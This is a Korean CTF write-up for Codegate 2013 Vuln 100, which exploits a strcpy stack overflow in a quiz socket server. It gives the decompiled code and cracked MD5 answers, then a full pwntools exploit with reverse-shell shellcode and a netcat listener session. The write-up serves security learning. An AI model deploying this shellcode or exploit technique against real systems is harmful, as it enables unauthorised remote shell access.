---
title: "[Codegate 2013 Quals] Vuln 100"
tag: writeup ctf
toc: true
---


## Introduction

소켓으로 통신하는 프로그램에서 strcpy 함수로 인한 스택 버퍼
오버플로우가 발생할 때 쉘을 딸 수 있는지 묻는 문제이다.

<br>

이 문제에서 생각해야 하는 것은 strcpy 함수가 리턴 주소 이전에 위치한
주소가 가리키는 곳에 데이터를 쓰기 때문에 리턴 주소까지 데이터를
덮어쓰는 방식을 사용할 수 없다는 것이다. 하지만 이는 strcpy 함수의 첫
번째 인자가 스택에 있는 값으로 설정된다는 것이므로 덮어쓸 수
있다. 이때 첫 번째 인자로 들어가는 주소를 본래 주소보다 큰 주소로
설정하면 다음 그림처럼 리턴 주소를 덮어쓸 수 있다.

    /* Original */
    src: [DDDDDDDDDDDDDDDDDDDDDDDDDD]
    dst: [DDDDDDDDDDDDDDDDDDDDDDDDDDSS]
                                     ^
                                     |
                                     +-- return address
    
    /* Overflow */
    src: [DDDDDDDDDDDDDDDDDDDDDDDDDD]
    dst: [??DDDDDDDDDDDDDDDDDDDDDDDDDD]
          ^ ^                        ^
          | |                        |
          | +-- overwritten dst      +-- overwritten return address
          +-- original dst

<br>

이 문제는 AMD64 리눅스 배포판에서 임시로 ASLR을
비활성화하면 환경을 맞출 수 있다. 


## Vulnerability

주어진 실행 파일을 기드라로 디컴파일하면 아래와 같은 main 함수를
얻는다. 아래의 코드를 읽어보면 퀴즈의 답을 맞추면 ({1}, {2}, {3})
argv에 0x800 바이트만큼의 데이터를 입력받아 저장한다는 것 ({4})을 알
수 있다. 즉, 퀴즈의 답을 다 맞추면 오버플로우를 발생시킬 수 있다.

    
    void main(undefined8 param_1,void *param_2)
    
    {
      char cVar1;
      int iVar2;
      __pid_t _Var3;
      long lVar4;
      ulong uVar5;
      char *pcVar6;
      undefined8 *puVar7;
      char *pcVar8;
      byte bVar9;
      char local_418 [48];
      char local_3e8 [240];
      char local_2f8 [48];
      undefined8 local_2c8 [38];
      char local_198 [48];
      undefined8 local_168 [27];
      socklen_t local_8c;
      sockaddr local_88;
      sockaddr local_78;
      undefined1 local_68 [16];
      undefined1 local_58 [16];
      undefined1 local_48 [12];
      int local_3c;
      char *local_38;
      int local_2c;
      char *local_28;
      int local_1c;
      char *local_18;
      int local_10;
      int local_c;
    
      bVar9 = 0;
      pcVar6 = 
      "It is Foot Ball Club. This Club is an English Primier league football club. This Club founded 188 6. This club Manager Arsene Wenger. This club Stadium is Emirates Stadium. What is this club? (onl y small letter)\n"
      ;
      puVar7 = local_168;
      for (lVar4 = 0x1a; lVar4 != 0; lVar4 = lVar4 + -1) {
        *puVar7 = *(undefined8 *)pcVar6;
        pcVar6 = pcVar6 + 8;
        puVar7 = puVar7 + 1;
      }
      *(undefined4 *)puVar7 = *(undefined4 *)pcVar6;
      builtin_strncpy(local_198,"1c5442c0461e5186126aaba26edd6857",0x21);
      pcVar6 = 
      "It is a royal palace locate in northern Seoul, South Korea. First constructed in 1395, laster bur ned and abandoned for almost three centuries, and then reconstructed in 1867, it was the main and largest place of the Five Grand Palaces built by the joseon Dynasty. What is it?(only small letter )\n"
      ;
      puVar7 = local_2c8;
      for (lVar4 = 0x25; lVar4 != 0; lVar4 = lVar4 + -1) {
        *puVar7 = *(undefined8 *)pcVar6;
        pcVar6 = pcVar6 + 8;
        puVar7 = puVar7 + 1;
      }
      builtin_strncpy(local_2f8,"eece6865e633b0ca4b5c0b32f21edfa2",0x21);
      pcVar6 = 
      "He is South Korean singer, songwriter, rapper, dancer and record producer. He is known domestical ly for his humorous videos and stage performances, and internationally for his hit single Gangnam Style. Who is he?(only small letter)\n"
      ;
      pcVar8 = local_3e8;
      for (lVar4 = 0x1d; lVar4 != 0; lVar4 = lVar4 + -1) {
        *(undefined8 *)pcVar8 = *(undefined8 *)pcVar6;
        pcVar6 = pcVar6 + 8;
        pcVar8 = pcVar8 + 8;
      }
      *pcVar8 = *pcVar6;
      builtin_strncpy(local_418,"30f54cbe2cabf23173198caaad89e7b9",0x21);
      local_c = socket(2,1,0);
      if (local_c == -1) {
        perror("socket");
        printf("socket error");
                        /* WARNING: Subroutine does not return */
        exit(1);
      }
      local_78.sa_family = 2;
      local_78.sa_data._0_2_ = htons(0x1a0a);
      local_78.sa_data[2] = '\0';
      local_78.sa_data[3] = '\0';
      local_78.sa_data[4] = '\0';
      local_78.sa_data[5] = '\0';
      local_78.sa_data[6] = '\0';
      local_78.sa_data[7] = '\0';
      local_78.sa_data[8] = '\0';
      local_78.sa_data[9] = '\0';
      local_78.sa_data[10] = '\0';
      local_78.sa_data[0xb] = '\0';
      local_78.sa_data[0xc] = '\0';
      local_78.sa_data[0xd] = '\0';
      iVar2 = bind(local_c,&local_78,0x10);
      if (iVar2 == -1) {
        perror("bind");
        printf("bind error");
                        /* WARNING: Subroutine does not return */
        exit(1);
      }
      iVar2 = listen(local_c,10);
      if (iVar2 == -1) {
        perror("listen");
        printf("listen error");
                        /* WARNING: Subroutine does not return */
        exit(1);
      }
      while( true ) {
        while( true ) {
          local_8c = 0x10;
          local_10 = accept(local_c,&local_88,&local_8c);
          if (local_10 != -1) break;
          perror("accept");
          printf("Accept");
        }
        _Var3 = fork();
        if (_Var3 == 0) break;
        close(local_10);
        do {
          _Var3 = waitpid(-1,(int *)0x0,1);
        } while (0 < _Var3);
      }
      send(local_10,"Welcome to CODEGATE2013.\nThis is quiz game.\nSolve the quiz.\n\n\n",0x3e,0);
      send(local_10,local_168,0xd4,0);
      recv(local_10,local_48,7,0);
      local_18 = (char *)FUN_00400b74(local_48,7);
      local_1c = strcmp(local_18,local_198); /* {1} */
      free(local_18);
      if (local_1c == 0) {
        send(local_10,"good!1\n",7,0);
        send(local_10,local_2c8,0x128,0);
        recv(local_10,local_58,0xd,0);
        recv(local_10,local_58,0xd,0);
        local_28 = (char *)FUN_00400b74(local_58,0xd);
        local_2c = strcmp(local_28,local_2f8); /* {2} */
        free(local_28);
        if (local_2c == 0) {
          send(local_10,"good!2\n",7,0);
          send(local_10,local_3e8,0xe9,0);
          recv(local_10,local_68,3,0);
          recv(local_10,local_68,3,0);
          local_38 = (char *)FUN_00400b74(local_68,3);
          local_3c = strcmp(local_38,local_418); /* {3} */
          free(local_38);
          if (local_3c == 0) {
            send(local_10,"good!3\n",7,0);
            send(local_10,"rank write! your nickname:\n",0x1c,0);
            recv(local_10,param_2,0x800,0); /* {4} */
            recv(local_10,param_2,0x800,0);
            FUN_00400c69(param_2);
            uVar5 = 0xffffffffffffffff;
            pcVar6 = DAT_006020d8;
            do {
              if (uVar5 == 0) break;
              uVar5 = uVar5 - 1;
              cVar1 = *pcVar6;
              pcVar6 = pcVar6 + (ulong)bVar9 * -2 + 1;
            } while (cVar1 != '\0');
            send(local_10,DAT_006020d8,~uVar5 - 3,0);
            send(local_10," very good ranker",0x10,0);
            send(local_10,"\ngame the end\n",0xf,0);
            close(local_10);
          }
          else {
            send(local_10,"fail!3\n",7,0);
            close(local_10);
          }
        }
        else {
          send(local_10,"fail!2\n",7,0);
          close(local_10);
        }
      }
      else {
        send(local_10,"fail!1\n",7,0);
        close(local_10);
      }
      close(local_c);
      return;
    }

이때 퀴즈의 답을 검증하는 방식은 MD5 해시를 사용한다. 다음 코드를
보자.

    
    void * FUN_00400b74(void *param_1,int param_2)
    
    {
      int local_94;
      void *local_90;
      byte local_88 [16];
      MD5_CTX local_78;
      void *local_18;
      int local_c;
    
      local_18 = malloc(0x21);
      MD5_Init(&local_78);
      local_90 = param_1;
      for (local_94 = param_2; 0 < local_94; local_94 = local_94 + -0x200) {
        if (local_94 < 0x201) {
          MD5_Update(&local_78,local_90,(long)local_94);
        }
        else {
          MD5_Update(&local_78,local_90,0x200);
        }
        local_90 = (void *)((long)local_90 + 0x200);
      }
      MD5_Final(local_88,&local_78);
      for (local_c = 0; local_c < 0x10; local_c = local_c + 1) {
        snprintf((char *)((long)(local_c * 2) + (long)local_18),0x20,"%02x",(ulong)local_88[local_c]);
      }
      return local_18;
    }

이렇게 검증하긴 하지만 퀴즈의 답은 구글에 나오는 해시 복호화 사이트에
상기 코드에 하드코딩된 해시값을 입력하면 나온다: 차례대로 arsenal,
gyeongbokgung, psy.

<br>

퀴즈의 답을 다 맞춘 후에 입력받은 데이터는 다음 코드의 함수에서
memcpy와 strcpy 함수를 사용하여 다시 복사한다. 이때 memcpy 함수를
호출하기 전에 널 바이트까지의 길이를 얻기 때문에 ({5}) 페이로드에
주소값이 들어간다면 그 이후의 데이터는 쓸 수 없다.

    
    void FUN_00400c69(char *param_1)
    
    {
      char cVar1;
      ulong uVar2;
      char *pcVar3;
      char local_118 [264];
      char *local_10;
    
      local_10 = local_118;
      uVar2 = 0xffffffffffffffff;
      pcVar3 = param_1;
      do { /* {5} */
        if (uVar2 == 0) break;
        uVar2 = uVar2 - 1;
        cVar1 = *pcVar3;
        pcVar3 = pcVar3 + 1;
      } while (cVar1 != '\0');
      memcpy(local_118,param_1,~uVar2 - 1);
      strcpy(local_10,param_1);
      DAT_006020d8 = local_10;
      return;
    }


## Exploit

Argv 근처에는 환경 변수가 위치하고 strcpy 함수는 널 바이트에 도달할
때까지 복사하므로 전송하는 페이로드의 길이를 늘려나가는 방식으로 환경
변수의 주소값을 얻을 수 있다. 그리고 상기에 언급하였듯이 ASLR이
적용되어 있지 않으므로 오프셋도 고정이다. 다만, 앞서 다루었듯이
페이로드에 주소값은 마지막에만 한 번 사용가능하다. 그래서 본래 strcpy
함수가 데이터를 쓰는 주소를 Saddr라고 할 때 다음 그림과 같이
페이로드를 구성하면

    payload = b'\x90' * 0x108 + p64(Saddr + 0x10)

memcpy 함수가 스택에 복사한 결과는 다음과 같을 것이다.

    Saddr        : 0x9090909090909090 0x9090909090909090
    Saddr + 0x10 : 0x9090909090909090 0x9090909090909090
       ...
    Saddr + 0x100: 0x9090909090909090 [ Saddr + 0x10   ]
    Saddr + 0x110: [ Saved RBP      ] [ Return address ]

그럼 strcpy 함수는 Saddr + 0x10부터 쓰기 시작하지만 널 바이트에 도달할
때까지 복사하므로 위 스택의 Return address는 Saddr + 0x10으로
덮어쓰여지게 된다. 이것이 가능한 이유는 strcpy 함수의 첫 번째 인자와
두 번째 인자가 무엇인지 살펴보면 알 수 있다. 아래 FUN\_400c69 함수의
어셈블리 코드를 보라.

                         **************************************************************
                         *                          FUNCTION                          *
                         **************************************************************
                         undefined FUN_00400c69()
         undefined         <UNASSIGNED>   <RETURN>
         undefined8        Stack[-0x10]:8 local_10                                XREF[3]:     00400c82(W), 
                                                                                               00400cdc(R), 
                                                                                               00400ceb(R)  
         undefined1        Stack[-0x118   local_118                               XREF[2]:     00400c7b(*), 
                                                                                               00400cbd(*)  
         undefined8        Stack[-0x120   local_120                               XREF[4]:     00400c74(W), 
                                                                                               00400c86(R), 
                                                                                               00400cb6(R), 
                                                                                               00400cd5(R)  
         undefined8        Stack[-0x128   local_128                               XREF[2]:     00400c8d(W), 
                                                                                               00400ca0(R)  
                         FUN_00400c69                                    XREF[3]:     main:00401219(c), 00401868, 
                                                                                      004018f0(*)  
    00400c69 55              PUSH       RBP
    00400c6a 48 89 e5        MOV        RBP,RSP
    00400c6d 48 81 ec        SUB        RSP,0x120
             20 01 00 00
    00400c74 48 89 bd        MOV        qword ptr [RBP + local_120],RDI
             e8 fe ff ff
    00400c7b 48 8d 85        LEA        RAX=>local_118,[RBP + -0x110]
             f0 fe ff ff
    00400c82 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
    00400c86 48 8b 85        MOV        RAX,qword ptr [RBP + local_120]
             e8 fe ff ff
    00400c8d 48 c7 85        MOV        qword ptr [RBP + local_128],-0x1
             e0 fe ff 
             ff ff ff 
    00400c98 48 89 c2        MOV        RDX,RAX
    00400c9b b8 00 00        MOV        EAX,0x0
             00 00
    00400ca0 48 8b 8d        MOV        RCX,qword ptr [RBP + local_128]
             e0 fe ff ff
    00400ca7 48 89 d7        MOV        RDI,RDX
    00400caa f2 ae           SCASB.RE   RDI
    00400cac 48 89 c8        MOV        RAX,RCX
    00400caf 48 f7 d0        NOT        RAX
    00400cb2 48 8d 70 ff     LEA        RSI,[RAX + -0x1]
    00400cb6 48 8b 95        MOV        RDX,qword ptr [RBP + local_120]
             e8 fe ff ff
    00400cbd 48 8d 85        LEA        RAX=>local_118,[RBP + -0x110]
             f0 fe ff ff
    00400cc4 48 89 d1        MOV        RCX,RDX
    00400cc7 48 89 f2        MOV        RDX,RSI
    00400cca 48 89 ce        MOV        RSI,RCX
    00400ccd 48 89 c7        MOV        RDI,RAX
    00400cd0 e8 ab fd        CALL       <EXTERNAL>::memcpy                               void * memcpy(void * __dest, voi
             ff ff
    00400cd5 48 8b 95        MOV        RDX,qword ptr [RBP + local_120]
             e8 fe ff ff
    00400cdc 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
    00400ce0 48 89 d6        MOV        RSI,RDX
    00400ce3 48 89 c7        MOV        RDI,RAX
    00400ce6 e8 45 fd        CALL       <EXTERNAL>::strcpy                               char * strcpy(char * __dest, cha
             ff ff
    00400ceb 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
    00400cef 48 89 05        MOV        qword ptr [DAT_006020d8],RAX                     = ??
             e2 13 20 00
    00400cf6 c9              LEAVE
    00400cf7 c3              RET

그리고 GDB를 통해 local\_120의 값을 조사하면 0x800 바이트만큼 입력을
받았던 argv 주소임을 알 수 있을 것이다.

    (gdb) x/32gx $rbp - 0x118
    0x7fffffffd7f8: 0x00007fffffffde68      0x9090909090909090
    0x7fffffffd808: 0x00007fffffffdf88      0x0000000000000000
    0x7fffffffd818: 0x0000000000000000      0x0000000000000000
    0x7fffffffd828: 0x0000000000000000      0x00007ffff7ffd040
    0x7fffffffd838: 0x0000000000000000      0x00007fffffffd8b8
    0x7fffffffd848: 0x00007fffffffd8a0      0x00007fffffffd890
    0x7fffffffd858: 0x00007ffff7a68871      0x0000000000000000
    0x7fffffffd868: 0x00007fffffffd910      0x00007fffffffde68
    0x7fffffffd878: 0x0000000000400c59      0xfffffe0300000000
    0x7fffffffd888: 0x00007fffffffdef0      0x31f2ab2cbe4cf530
    0x7fffffffd898: 0xb9e789adaa8c1973      0x31f2ab2cbe4cf530
    0x7fffffffd8a8: 0xf7973b5e0400ec00      0x0000000000000018
    0x7fffffffd8b8: 0xffffffffffffff80      0x0000000000000000
    0x7fffffffd8c8: 0x00007fffffffde68      0x0000000000400cf8
    0x7fffffffd8d8: 0x0000000000000000      0x00007ffff7ffd040
    0x7fffffffd8e8: 0x00007ffff76a5453      0x0000000000000000

지금까지의 과정을 통해 리턴 주소를 덮어쓰는 것이 가능해졌으므로 쉘
코드를 맨 앞에 위치시키면 쉘 코드로 점프하는 것이 되며, 이를 코드로
작성하면 다음과 같다.

    from pwn import *
    import time
    
    def dump_stack(h, p):
        # When a payload (e.g., "AAAA...") length exceeds 0x109, it
        # overwrites the RBP register. This causes an error in the child
        # process, which makes receiving the stack data impossible.
        for count in range(0xf, 0x1000, 8):
            r = remote(h, p)
            r.sendlineafter(b")\n", b"arsenal")
            r.sendlineafter(b")\n", b"gyeongbokgung")
            r.sendlineafter(b")\n", b"psy")
    
            payload = b'A' * count
            # payload += p64(send_plt_addr)
            r.sendlineafter(b"rank write! your nickname:\n", payload)
            time.sleep(1)
            recv_data = r.recvall()
            leaked = recv_data[len(payload) + 2:len(payload) + 2 + 4]
            print(f"{count}: {recv_data}")
            print(f"Leaked: {leaked}")
    
    def exploit():
        r = remote("localhost", "6666")
    
        send_plt_addr = 0x400a20
        shellcode = b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\xb8\xff\xff\xff\xff\x11\x11\x11\x11\x48\xbb\x80\xff\xff\xfe\x11\x11\x11\x11\x48\x29\xd8\x50\x48\xb8\xff\xff\xff\xff\x11\x11\x11\x11\x48\xbb\xfd\xff\xee\xa3\x11\x11\x11\x11\x48\x29\xd8\x50\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x03\x75\xf2\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xd2\x6a\x3b\x58\x0f\x05"
    
        print(len(shellcode))
    
        r.sendlineafter(b"(only small letter)\n", b"arsenal")
        r.sendlineafter(b"(only small letter)\n", b"gyeongbokgung")
        r.sendlineafter(b"(only small letter)\n", b"psy")
    
        leaked = b"6\xe2\xff\xff"
        stack_addr = ((0x7fff << 32) | u32(leaked)) - 0xa36
        print(f"Final stack address: {hex(stack_addr)}")
        ret_addr = stack_addr + 0x118
        print(f"Return address: {hex(ret_addr)}")
        argv_addr = stack_addr + 0x668
        print(f"Argv address: {hex(argv_addr)}")
    
        payload = shellcode
        payload += b'\x90' * (0x108 - len(payload))
        payload += p64(stack_addr + 0x10)
        r.sendafter(b":\n", payload)
    
        r.interactive()
    
    def main():
        # dump_stack("localhost", "6666")
        exploit()
    
    main()

위 코드의 쉘 코드는 4444번 포트로 연결을 시도하는 클라이언트이므로
실행하기 전에 다음과 같은 명령어를 통해 4444번 포트를 통한 연결 시도를
확인해야 한다.

    $ nc -lvp 4444

그럼 아래와 같이 연결 시도가 확인되며 쉘을 얻는다.

    $ nc -lvp 4444
    Listening on 0.0.0.0 4444
    Connection received on localhost 45480
    ls
    94dd6790cbf7ebfc5b28cc289c480e5e
    ex.py
    ghidra_project
    openssl-1.0.0
    openssl-1.0.0.tar.gz
    server.gdb
    server.py
    vuln100

